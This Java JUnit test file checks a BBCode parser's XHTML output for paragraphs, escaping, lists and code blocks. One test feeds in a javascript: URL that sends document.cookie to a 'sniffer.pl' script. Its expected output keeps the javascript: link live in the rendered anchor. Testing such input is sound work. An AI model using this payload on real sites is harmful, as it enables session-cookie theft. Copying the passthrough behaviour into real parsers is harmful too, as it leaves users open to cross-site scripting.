package ru.org.bbcode;

import junit.framework.Assert;
import org.junit.Test;

/**
 * Created by IntelliJ IDEA.
 * User: hizel
 * Date: 7/5/11
 * Time: 11:15 PM
 */
public class OldParseTest {
    @Test
    public void pTest(){
        Parser parser = new Parser(false);
        parser.parse("test\ntest1\n\ntest2");
        Assert.assertEquals(parser.renderXHtml(), "<div><p>test\ntest1</p>test2</div>");
    }

    @Test
    public void tagEscapeTest(){
        Parser parser = new Parser(false);
        parser.parse("<br>");
        Assert.assertEquals(parser.renderXHtml(), "<div>&lt;br&gt;</div>");
    }

    @Test
    public void urlEscapeTest(){
        Parser parser = new Parser(false);
        parser.parse("[url=javascript:var c=new Image();c.src=\"http://127.0.0.1/sniffer.pl?\"+document.cookie;close()]Test[/url]");
        Assert.assertEquals(parser.renderXHtml(), "<div><a href=\"javascript:var c=new Image();c.src=&quot;http://127.0.0.1/sniffer.pl?&quot;+document.cookie;close()\">Test</a></div>");
    }

    @Test
    public void badListTest(){
        Parser parser = new Parser(false);
        parser.parse("[list]0[*]1[*]2[/list]");
        Assert.assertEquals(parser.renderXHtml(), "<div>0<ul><li>1</li><li>2</li></ul></div>");
    }

    @Test
    public void codeEscapeTest(){
        Parser parser = new Parser(false);
        parser.parse("[code]\"code&code\"[/code]");
        Assert.assertEquals(parser.renderXHtml(), "<pre><code>&quot;code&amp;code&quot;</code></pre>");
    }

}
